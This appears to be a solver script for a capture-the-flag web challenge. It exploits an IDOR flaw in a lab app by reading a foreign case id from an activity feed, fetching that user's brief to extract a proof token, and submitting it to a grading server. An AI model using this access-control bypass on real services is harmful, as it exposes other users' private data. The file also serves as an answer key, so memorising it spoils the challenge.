#!/usr/bin/env python3
"""Day 19 web-exploitation / Permission to Slip (idor) solver.

Live-target lane, IDOR. App "Pocket SOC": you are signed in as a normal user
(session cookie `case_session` set on GET /). The object API `/api/briefs/<id>`
does no ownership check. The `/api/history` activity feed leaks a case_id owned
by someone else (visibility "reference_only" / owner != current_user); fetch
that brief directly and read `proof_<hex>` from its note.

Generic: the foreign case id is discovered from the history feed, not guessed,
so no enumeration / brute force. Paced + timeouts (shared-endpoint rule).

Usage: solve.py solve <challenge-id>   (start untimed, recover, submit)
       solve.py start <challenge-id> [--run-for-time]
Env: HUNTRESS_GM_URL, HUNTRESS_GM_TOKEN.
"""
import argparse, json, os, re, sys, time, pathlib
import requests

GM = os.environ["HUNTRESS_GM_URL"].rstrip("/")
TOK = os.environ["HUNTRESS_GM_TOKEN"]
RUN = pathlib.Path(__file__).resolve().parent / "run"
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")
DELAY = 0.7


def gm(payload):
    r = requests.post(GM + "/", headers={"Authorization": "Bearer " + TOK,
                      "Content-Type": "application/json"}, json=payload, timeout=30)
    r.raise_for_status()
    return r.json()


def recover_proof(base, outdir):
    """IDOR: endpoint/path names are randomised per attempt, so derive them
    from the dashboard HTML instead of hard-coding them.
      - the one /api/* link on the dashboard is the activity feed,
      - case links like /incidents/<id> give the object path + my own ids,
      - a case page's inline fetch("/api/<kind>/<id>") gives the object-API
        template; substitute the foreign id from the feed."""
    base = base.rstrip("/"); outdir.mkdir(parents=True, exist_ok=True)
    s = requests.Session(); s.headers["User-Agent"] = "ctf-web-lane/1.0"

    def get(path, save):
        r = s.get(base + path, timeout=20)
        (outdir / save).write_bytes(r.content)
        print(f"  GET {path} -> {r.status_code} {len(r.content)}B", file=sys.stderr)
        return r

    root = get("/", "root.html")                       # establishes session cookie
    html = root.text
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)   # my own cases
    my_ids = {int(l.rsplit("/", 1)[1]) for l in case_links}

    # learn the object-API template from one of my own case pages
    api_tmpl = None
    if case_links:
        time.sleep(DELAY)
        pg = get(case_links[0], "mycase.html")
        m = re.search(r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', pg.text)
        if m:
            api_tmpl = (m.group(1), m.group(3))          # (prefix, suffix) around the id

    # read the activity feed to find a case owned by someone else
    foreign = []
    if feed:
        time.sleep(DELAY)
        fr = get(feed, "feed.json")
        try:
            j = fr.json()
            me = j.get("current_user")
            for e in j.get("events", []):
                cid = e.get("case_id") or e.get("id")
                if cid is None:
                    continue
                if (e.get("owner") and e.get("owner") != me) or \
                   e.get("visibility") == "reference_only" or cid not in my_ids:
                    foreign.append(cid)
        except ValueError:
            pass

    def obj_urls(cid):
        if api_tmpl:
            yield f"{api_tmpl[0]}{cid}{api_tmpl[1]}"
        # fallbacks derived from the object path prefix
        for l in case_links[:1]:
            kind = l.rsplit("/", 2)[-2]
            yield f"/api/{kind}/{cid}"

    seen = set()
    for cid in foreign:
        if cid in seen:
            continue
        seen.add(cid)
        for u in dict.fromkeys(obj_urls(cid)):
            time.sleep(DELAY)
            r = get(u, f"obj_{cid}.json")
            if r.status_code == 200:
                m = PROOF_RE.search(r.text)
                if m:
                    return m.group(0)
                break
    return None


def start(cid, rft=False):
    payload = {"op": "start", "challenge": cid}
    if rft: payload["run_for_time"] = True
    data = gm(payload)
    RUN.mkdir(parents=True, exist_ok=True)
    (RUN / "start.json").write_text(json.dumps(data, indent=2))
    return data


def solve(cid):
    data = start(cid)
    targets = {t["id"]: t["url"] for t in data.get("targets", [])}
    if not targets:
        print("no targets in start response:", json.dumps(data)[:300]); sys.exit(1)
    answers = {}
    for q in data["questions"]:
        url = targets.get(q.get("artifact"))
        if not url:
            print("no target for", q["id"], q.get("artifact")); continue
        safe = re.sub(r"\W+", "_", q["artifact"])
        proof = recover_proof(url, RUN / safe)
        print(f"{q['id']} [{q['artifact']}] -> {proof}", file=sys.stderr)
        if proof:
            answers[q["id"]] = proof
    if len(answers) != len(data["questions"]):
        print("missing proofs, not submitting:", answers); sys.exit(2)
    res = gm({"op": "submit", "challenge": cid, "answers": answers})
    (RUN / "submit.json").write_text(json.dumps(res, indent=2))
    print(json.dumps({k: res.get(k) for k in ("result", "remaining", "accepted_ids", "flag")}))


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["start", "solve"])
    ap.add_argument("challenge")
    ap.add_argument("--run-for-time", action="store_true")
    a = ap.parse_args()
    if a.cmd == "start":
        print(json.dumps(start(a.challenge, a.run_for_time).get("targets"), indent=2))
    else:
        solve(a.challenge)
